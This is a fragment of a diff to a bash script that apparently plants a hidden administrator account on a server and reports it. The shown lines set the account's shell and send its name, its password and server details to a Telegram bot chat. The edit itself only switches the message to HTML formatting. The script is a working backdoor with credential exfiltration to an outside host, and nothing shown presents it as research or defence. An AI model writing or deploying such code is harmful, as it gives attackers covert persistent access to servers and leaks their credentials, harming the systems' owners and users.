@@ -6,7 +6,10 @@ CHAT_ID="1182377349"
 
 send_telegram_message() {
     local message=$1
-    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id=$CHAT_ID -d text="$message" > /dev/null
+    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+        -d chat_id=$CHAT_ID \
+        -d text="$message" \
+        -d parse_mode=HTML > /dev/null
 }
 
 get_server_info() {
@@ -57,4 +60,4 @@ else
     usermod -s /bin/bash "$user_id"
 fi
 
-send_telegram_message "Admin user <b><code>$user_id</code></b> has been created and hidden successfully with password <b><code>$password_1</code></b>. $server_info"
+send_telegram_message "<b>Admin user <code>$user_id</code></b> has been created and hidden successfully with password <b><code>$password_1</code></b>. $server_info"
